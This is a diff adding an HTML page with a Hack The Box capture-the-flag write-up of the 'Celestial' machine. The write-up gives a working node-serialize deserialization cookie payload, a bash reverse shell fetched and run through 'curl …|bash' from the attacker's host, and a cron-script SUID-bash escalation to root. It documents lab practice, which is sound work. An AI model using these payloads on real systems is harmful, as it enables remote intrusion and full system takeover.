@@ -1,0 +1,388 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>HTB: Celestial :: The Logan Lab</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="**HTB | Celestial - Write up**" />
+<meta name="keywords" content=", " />
+<meta name="robots" content="noodp" />
+<link rel="canonical" href="https://theloganlab.github.io/posts/celest/" />
+
+
+
+
+<link rel="stylesheet" href="https://theloganlab.github.io/assets/style.css">
+
+  <link rel="stylesheet" href="https://theloganlab.github.io/assets/green.css">
+
+
+
+
+
+
+<link rel="apple-touch-icon" href="https://theloganlab.github.io/img/apple-touch-icon-192x192.png">
+
+  <link rel="shortcut icon" href="https://theloganlab.github.io/img/favicon/green.png">
+
+
+
+<meta name="twitter:card" content="summary" />
+
+  
+    <meta name="twitter:site" content="" />
+  
+    <meta name="twitter:creator" content="" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="HTB: Celestial">
+<meta property="og:description" content="**HTB | Celestial - Write up**" />
+<meta property="og:url" content="https://theloganlab.github.io/posts/celest/" />
+<meta property="og:site_name" content="The Logan Lab" />
+
+  <meta property="og:image" content="https://theloganlab.github.io/Celestial.png">
+
+<meta property="og:image:width" content="2048">
+<meta property="og:image:height" content="1024">
+
+
+  <meta property="article:published_time" content="2022-07-12 15:35:34 -0500 -05" />
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body class="green">
+
+
+<div class="container full headings--one-size">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    l0gan334&#39;s lab
+  </div>
+</a>
+
+    </div>
+    
+      <div class="menu-trigger">menu</div>
+    
+  </div>
+  
+    <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+          <li><a href="/about">About</a></li>
+        
+      
+        
+          <li><a href="https://app.hackthebox.com/profile/overview">HTB profile</a></li>
+        
+      
+      
+    
+
+    
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="/about">About</a></li>
+      
+    
+      
+        <li><a href="https://app.hackthebox.com/profile/overview">HTB profile</a></li>
+      
+    
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<div class="post">
+  <h1 class="post-title">
+    <a href="https://theloganlab.github.io/posts/celest/">HTB: Celestial</a></h1>
+  <div class="post-meta">
+    
+      <span class="post-date">
+        2022-07-12
+        
+      </span>
+    
+    
+      <span class="post-author">:: l0gan334</span>
+    
+    
+  </div>
+
+  
+  <span class="post-tags">
+    
+    #<a href="https://theloganlab.github.io/tags/nodejs/">nodejs</a>&nbsp;
+    
+    #<a href="https://theloganlab.github.io/tags/deserialization/">deserialization</a>&nbsp;
+    
+    #<a href="https://theloganlab.github.io/tags/crontab/">crontab</a>&nbsp;
+    
+    #<a href="https://theloganlab.github.io/tags/linux/">linux</a>&nbsp;
+    
+  </span>
+  
+  
+  <img src="https://theloganlab.github.io/Celestial.png"
+    class="post-cover"
+    alt="HTB: Celestial"
+    title="Cover Image" />
+
+
+  
+
+  <div class="post-content"><div>
+        <p><strong>Celestial</strong> is a very easy machine that for some reason is ranked <em>medium</em>.</p>
+<p>It&rsquo;s very simple, first we will do a Node.js deserialization attack to get RCE and a reverse shell.</p>
+<p>And for root we will inject a command in a script that&rsquo;s being executed as a crontab</p>
+<h1 id="recon"><strong><code>Recon</code></strong><a href="#recon" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<h1 id="nmap">Nmap<a href="#nmap" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>Nmap finds only one opened port:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ nmap -p- -sS --min-rate <span style="color:#ae81ff">5000</span> --open -v -n -Pn 10.129.75.136 -oG allPorts
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Host discovery disabled <span style="color:#f92672">(</span>-Pn<span style="color:#f92672">)</span>. All addresses will be marked up and scan times may be slower.
+</span></span><span style="display:flex;"><span>Starting Nmap 7.92 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2022-07-12 15:48 -05
+</span></span><span style="display:flex;"><span>Initiating SYN Stealth Scan at 15:48
+</span></span><span style="display:flex;"><span>Scanning 10.129.75.136 <span style="color:#f92672">[</span><span style="color:#ae81ff">65535</span> ports<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>Discovered open port 3000/tcp on 10.129.75.136
+</span></span><span style="display:flex;"><span>Completed SYN Stealth Scan at 15:48, 14.77s elapsed <span style="color:#f92672">(</span><span style="color:#ae81ff">65535</span> total ports<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.129.75.136
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.16s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">65534</span> closed tcp ports <span style="color:#f92672">(</span>reset<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>PORT     STATE SERVICE
+</span></span><span style="display:flex;"><span>3000/tcp open  ppp
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Read data files from: /usr/bin/../share/nmap
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 14.88 seconds
+</span></span><span style="display:flex;"><span>           Raw packets sent: <span style="color:#ae81ff">72461</span> <span style="color:#f92672">(</span>3.188MB<span style="color:#f92672">)</span> | Rcvd: <span style="color:#ae81ff">72456</span> <span style="color:#f92672">(</span>2.898MB<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>Let&rsquo;s inspect it deeper with parameters <strong>-sCV</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ nmap -sCV -p3000 10.129.75.136 -oN targeted
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Starting Nmap 7.92 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2022-07-12 15:49 -05
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.129.75.136
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.17s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PORT     STATE SERVICE VERSION
+</span></span><span style="display:flex;"><span>3000/tcp open  http    Node.js Express framework
+</span></span><span style="display:flex;"><span>|_http-title: Site doesn<span style="color:#960050;background-color:#1e0010">&#39;</span>t have a title <span style="color:#f92672">(</span>text/html; charset<span style="color:#f92672">=</span>utf-8<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 16.02 seconds
+</span></span></code></pre></div><h1 id="http-server">HTTP server<a href="#http-server" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>It&rsquo;s an http server running Node.js, let&rsquo;s take a look:</p>
+
+  <img src="/img/cel2.png"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />
+
+
+
+  <img src="/img/cel1.png"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>We get a &ldquo;404&rdquo; but after a reload we get different content.</p>
+<p>The website doesn&rsquo;t seem to be doing much.</p>
+<p>Checking for cookies we have one:
+
+  <img src="/img/cel3.png"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />
+
+</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ echo <span style="color:#e6db74">&#39;eyJ1c2VybmFtZSI6IkR1bW15IiwiY291bnRyeSI6IklkayBQcm9iYWJseSBTb21ld2hlcmUgRHVtYiIsImNpdHkiOiJMYW1ldG93biIsIm51bSI6IjIifQ==&#39;</span> | base64 -d
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">{</span><span style="color:#e6db74">&#34;username&#34;</span>:<span style="color:#e6db74">&#34;Dummy&#34;</span>,<span style="color:#e6db74">&#34;country&#34;</span>:<span style="color:#e6db74">&#34;Idk Probably Somewhere Dumb&#34;</span>,<span style="color:#e6db74">&#34;city&#34;</span>:<span style="color:#e6db74">&#34;Lametown&#34;</span>,<span style="color:#e6db74">&#34;num&#34;</span>:<span style="color:#e6db74">&#34;2&#34;</span><span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>❯ echo <span style="color:#e6db74">&#39;{&#34;username&#34;:&#34;l0gan334&#34;,&#34;country&#34;:&#34;Idk Probably Somewhere Dumb&#34;,&#34;city&#34;:&#34;Lametown&#34;,&#34;num&#34;:&#34;2&#34;}&#39;</span> | base64 -w <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>eyJ1c2VybmFtZSI6ImwwZ2FuMzM0IiwiY291bnRyeSI6IklkayBQcm9iYWJseSBTb21ld2hlcmUgRHVtYiIsImNpdHkiOiJMYW1ldG93biIsIm51bSI6IjIifQo<span style="color:#f92672">=</span>
+</span></span></code></pre></div><p>Let&rsquo;s try to change the values:
+
+  <img src="/img/cel4.png"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />
+
+</p>
+<h1 id="nodejs-deserialization-attack">Node.js deserialization attack<a href="#nodejs-deserialization-attack" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>It looks like our cookie is being deserialized and interpreted by the website.</p>
+<p>As it&rsquo;s running Node.js it directly leads me to think about a Node.js deserialization attack. Here you have very useful blog that explains the vulnerability:</p>
+<pre tabindex="0"><code>https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/
+</code></pre><p>We can exploit this vulnerability with this oneliner that will execute a command once it&rsquo;s deserialized:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">{</span><span style="color:#e6db74">&#34;rce&#34;</span>:<span style="color:#e6db74">&#34;_</span>$$<span style="color:#e6db74">ND_FUNC</span>$$<span style="color:#e6db74">_function (){require(&#39;child_process&#39;).exec(&#39;whoami&#39;,function(error, stdout, stderr) { console.log(stdout) });}()&#34;</span><span style="color:#f92672">}</span>
+</span></span></code></pre></div><p>Let&rsquo;s encode this in base64 and inject it in the cookie field:</p>
+
+  <img src="/img/cel5.png"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>We get an error, but maybe the command is still being executed so let&rsquo;s try to get us a reverse shell.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ echo <span style="color:#e6db74">&#39;bash -i &gt;&amp; /dev/tcp/10.10.14.161/334 0&gt;&amp;1&#39;</span> &gt; index.html
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>❯ python3 -m http.server <span style="color:#ae81ff">80</span>
+</span></span><span style="display:flex;"><span>Serving HTTP on 0.0.0.0 port <span style="color:#ae81ff">80</span> <span style="color:#f92672">(</span>http://0.0.0.0:80/<span style="color:#f92672">)</span> ...
+</span></span></code></pre></div><p>We will share an index.html in a http server with the usual command we use to get a reverse shell in bash.</p>
+<p>And from the injection, we will make the machine curl to our http server and execute the index with <strong>bash</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">{</span><span style="color:#e6db74">&#34;rce&#34;</span>:<span style="color:#e6db74">&#34;_</span>$$<span style="color:#e6db74">ND_FUNC</span>$$<span style="color:#e6db74">_function (){require(&#39;child_process&#39;).exec(&#39;curl 10.10.14.161|bash&#39;,function(error, stdout, stderr) { console.log(stdout) });}()&#34;</span><span style="color:#f92672">}</span>
+</span></span></code></pre></div><p>Set the netcat and send the payload in the web:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ nc -lvnp <span style="color:#ae81ff">334</span>
+</span></span><span style="display:flex;"><span>Ncat: Version 7.92 <span style="color:#f92672">(</span> https://nmap.org/ncat <span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Ncat: Listening on :::334
+</span></span><span style="display:flex;"><span>Ncat: Listening on 0.0.0.0:334
+</span></span><span style="display:flex;"><span>Ncat: Connection from 10.129.75.136.
+</span></span><span style="display:flex;"><span>Ncat: Connection from 10.129.75.136:36800.
+</span></span><span style="display:flex;"><span>bash: cannot set terminal process group <span style="color:#f92672">(</span>3676<span style="color:#f92672">)</span>: Inappropriate ioctl <span style="color:#66d9ef">for</span> device
+</span></span><span style="display:flex;"><span>bash: no job control in this shell
+</span></span><span style="display:flex;"><span>sun@sun:~$
+</span></span></code></pre></div><p>We get a shell but not an interactive <strong>tty</strong>, so if we do ^C we lose the connection with a tty treatment we can fix this:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sun@sun:~$ script /dev/null -c bash
+</span></span><span style="display:flex;"><span>script /dev/null -c bash
+</span></span><span style="display:flex;"><span>Script started, file is /dev/null
+</span></span><span style="display:flex;"><span>sun@sun:~$ ^Z
+</span></span><span style="display:flex;"><span>zsh: suspended  nc -lvnp <span style="color:#ae81ff">334</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>❯ stty raw -echo; fg
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>1<span style="color:#f92672">]</span>  + continued  nc -lvnp <span style="color:#ae81ff">334</span>
+</span></span><span style="display:flex;"><span>                              reset xterm
+</span></span></code></pre></div><p>And lastly some final touches like the screen size (you can get yours doing <code>stty size</code>):</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sun@sun:~$ export TERM<span style="color:#f92672">=</span>xterm
+</span></span><span style="display:flex;"><span>sun@sun:~$ export SHELL<span style="color:#f92672">=</span>bash
+</span></span><span style="display:flex;"><span>sun@sun:~$ stty rows <span style="color:#ae81ff">40</span> columns <span style="color:#ae81ff">145</span>
+</span></span></code></pre></div><p>Inside our home directoy we see a Windows like folder structure, and inside Documents we have the <strong>user.txt</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sun@sun:~/Documents$ ls
+</span></span><span style="display:flex;"><span>script.py  user.txt
+</span></span><span style="display:flex;"><span>sun@sun:~/Documents$ cat user.txt
+</span></span><span style="display:flex;"><span>9a093cd22ce86b******************
+</span></span></code></pre></div><h1 id="privesc"><strong><code>Privesc</code></strong><a href="#privesc" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>Inside our home directory we see an <strong>output.txt</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sun@sun:~$ cat output.txt
+</span></span><span style="display:flex;"><span>Script is running...
+</span></span></code></pre></div><h1 id="pspy">Pspy<a href="#pspy" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>There&rsquo;s probably a crontab running so let&rsquo;s deploy <strong>pspy</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sun@sun:/tmp$ ./pspy
+</span></span><span style="display:flex;"><span>pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>     ██▓███    ██████  ██▓███ ▓██   ██▓
+</span></span><span style="display:flex;"><span>    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
+</span></span><span style="display:flex;"><span>    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
+</span></span><span style="display:flex;"><span>    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
+</span></span><span style="display:flex;"><span>    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
+</span></span><span style="display:flex;"><span>    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒
+</span></span><span style="display:flex;"><span>    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░
+</span></span><span style="display:flex;"><span>    ░░       ░  ░  ░  ░░       ▒ ▒ ░░
+</span></span><span style="display:flex;"><span>                   ░           ░ ░
+</span></span><span style="display:flex;"><span>                               ░ ░
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Config: Printing events <span style="color:#f92672">(</span>colored<span style="color:#f92672">=</span>true<span style="color:#f92672">)</span>: processes<span style="color:#f92672">=</span>true | file-system-events<span style="color:#f92672">=</span>false <span style="color:#f92672">||</span>| Scannning <span style="color:#66d9ef">for</span> processes every 100ms and on inotify events <span style="color:#f92672">||</span>| Watching directories: <span style="color:#f92672">[</span>/usr /tmp /etc /home /var /opt<span style="color:#f92672">]</span> <span style="color:#f92672">(</span>recursive<span style="color:#f92672">)</span> | <span style="color:#f92672">[]</span> <span style="color:#f92672">(</span>non-recursive<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Draining file system events due to startup...
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">done</span>
+</span></span><span style="display:flex;"><span>2022/07/12 17:30:33 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>    PID<span style="color:#f92672">=</span><span style="color:#ae81ff">97</span>     |
+</span></span></code></pre></div><p>After some minutes we see this:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>2022/07/12 17:35:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>    PID<span style="color:#f92672">=</span><span style="color:#ae81ff">6019</span>   | python /home/sun/Documents/script.py
+</span></span><span style="display:flex;"><span>2022/07/12 17:35:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>    PID<span style="color:#f92672">=</span><span style="color:#ae81ff">6018</span>   | /bin/sh -c python /home/sun/Documents/script.py &gt; /home/sun/output.txt; cp /root/script.py /home/sun/Documents/script.py; chown sun:sun /home/sun/Documents/script.py; chattr -i /home/sun/Documents/script.py; touch -d <span style="color:#e6db74">&#34;</span><span style="color:#66d9ef">$(</span>date -R -r /home/sun/Documents/user.txt<span style="color:#66d9ef">)</span><span style="color:#e6db74">&#34;</span> /home/sun/Documents/script.py
+</span></span></code></pre></div><p>Root is executing a script inside <strong>/home/sun/Documents/</strong>, we know this because of the UID. Let&rsquo;s check if we have any permissions over this file:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sun@sun:/tmp$ ls -l /home/sun/Documents/script.py
+</span></span><span style="display:flex;"><span>-rw-rw-r-- <span style="color:#ae81ff">1</span> sun sun <span style="color:#ae81ff">29</span> Sep <span style="color:#ae81ff">21</span>  <span style="color:#ae81ff">2017</span> /home/sun/Documents/script.py
+</span></span></code></pre></div><h1 id="execution-as-root">Execution as root<a href="#execution-as-root" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>We can write anything we want in this file so it doesn&rsquo;t get any easier than just executing a command in python.</p>
+<p>I will change the bash privileges to SUID:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> os
+</span></span><span style="display:flex;"><span>os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#34;chmod u+s /bin/bash&#34;</span>)
+</span></span></code></pre></div><p>Now once the script is executed again this command will be run and we can spawn a bash as root:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sun@sun:/tmp$ ls -l /bin/bash
+</span></span><span style="display:flex;"><span>-rwsr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">1037528</span> Jun <span style="color:#ae81ff">24</span>  <span style="color:#ae81ff">2016</span> /bin/bash
+</span></span><span style="display:flex;"><span>sun@sun:/tmp$ bash -p
+</span></span><span style="display:flex;"><span>bash-4.3# whoami
+</span></span><span style="display:flex;"><span>root
+</span></span></code></pre></div><p>Very simple. Now we can get the <strong>root.txt</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>bash-4.3# cat /root/root.txt
+</span></span><span style="display:flex;"><span>ba1d0019200a54******************
+</span></span></code></pre></div><p>See you next time!</p>
+
+      </div></div>
+
+  
+  
+<div class="pagination">
+    <div class="pagination__title">
+        <span class="pagination__title-h">Read other posts</span>
+        <hr />
+    </div>
+    <div class="pagination__buttons">
+        
+        <span class="button previous">
+            <a href="https://theloganlab.github.io/posts/kotarak/">
+                <span class="button__icon">←</span>
+                <span class="button__text">HTB: Kotarak</span>
+            </a>
+        </span>
+        
+        
+        <span class="button next">
+            <a href="https://theloganlab.github.io/posts/hawk/">
+                <span class="button__text">HTB: Hawk</span>
+                <span class="button__icon">→</span>
+            </a>
+        </span>
+        
+    </div>
+</div>
+
+  
+
+  
+  
+
+  
+</div>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2022 Powered by <a href="http://gohugo.io">Hugo</a></span>
+    
+      </div>
+  </div>
+</footer>
+
+<script src="https://theloganlab.github.io/assets/main.js"></script>
+<script src="https://theloganlab.github.io/assets/prism.js"></script>
+
+
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
